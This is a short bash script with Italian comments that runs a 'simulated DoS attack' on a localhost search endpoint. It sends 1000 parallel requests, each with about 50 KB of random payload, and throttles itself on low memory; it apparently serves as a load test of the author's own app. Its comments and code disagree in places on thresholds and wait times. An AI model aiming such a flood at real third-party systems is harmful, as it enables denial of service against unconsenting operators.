#!/bin/bash

# URL della rotta da attaccare
URL="http://localhost:8000/articles/search"

# Generare un grande payload casuale
LARGE_PAYLOAD=$(head -c 50000 < /dev/urandom | base64)

# Numero di richieste da inviare
NUM_REQUESTS=1000

# Limite massimo di processi simultanei
MAX_PARALLEL_REQUESTS=200

# Funzione per eseguire la richiesta
send_request() {
    curl -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null 2>&1
}

# Funzione per calcolare la memoria libera su macOS usando vm_stat
check_memory() {
    # Ottenere il numero di pagine libere da vm_stat
    FREE_MEM_PAGES=$(vm_stat | grep "Pages free" | awk '{print $3}' | sed 's/\.//')
    PAGE_SIZE=$(vm_stat | grep "page size of" | awk '{print $8}')

    # Converti le pagine libere in MB
    FREE_MEM_MB=$((FREE_MEM_PAGES * PAGE_SIZE / 1024 / 1024))

    # Se la memoria disponibile è inferiore a 100MB, sospendi lo script
    if [[ "$FREE_MEM_MB" -lt 50 ]]; then
        echo "Memoria bassa ($FREE_MEM_MB MB), attendo 10 secondi prima di riprendere..."
        sleep 1
    fi
}

# Esegui richieste in parallelo con limitazione
run_requests() {
    echo "Inizio attacco DoS simulato..."

    for ((i=1; i<=NUM_REQUESTS; i++))
    do
        # Controlla la memoria disponibile prima di lanciare nuove richieste
        check_memory

        # Lancia la richiesta in background
        send_request &
        echo "Richiesta $i inviata"

        # Controlla il numero di processi in background
        while [[ $(jobs -r | wc -l) -ge $MAX_PARALLEL_REQUESTS ]]; do
            sleep 1  # Aspetta un secondo prima di controllare di nuovo
        done
    done

    # Aspetta che tutti i processi terminino
    wait
    echo "Attacco DoS simulato completato!"
}

# Avvia lo script
run_requests
